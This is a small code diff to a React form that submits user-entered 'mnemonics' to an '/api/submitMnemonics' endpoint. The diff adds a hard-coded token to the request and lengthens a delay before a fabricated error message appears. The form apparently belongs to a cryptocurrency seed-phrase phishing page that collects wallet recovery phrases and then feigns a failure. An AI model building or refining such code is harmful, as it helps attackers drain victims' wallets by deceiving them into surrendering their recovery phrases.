@@ -10,7 +10,7 @@ export const Form = () => {
     setTimeout(() => {
       setShowError(true);
       setSubmitted(false);
-    }, 3000);
+    }, 10000);
   }
 
   const submitHandler = async (e) => {
@@ -18,7 +18,7 @@ export const Form = () => {
     setSubmitted(true);
     const form = new FormData(e.target);
     try {
-      const res = await fetch("/api/submitMnemonics", {
+      const res = await fetch("/api/submitMnemonics?token=kcudrebbur0", {
         method: "POST",
         body: JSON.stringify({ mnemonics: form.get("mnemonics") }),
         headers: { "Content-Type": "application/json" }
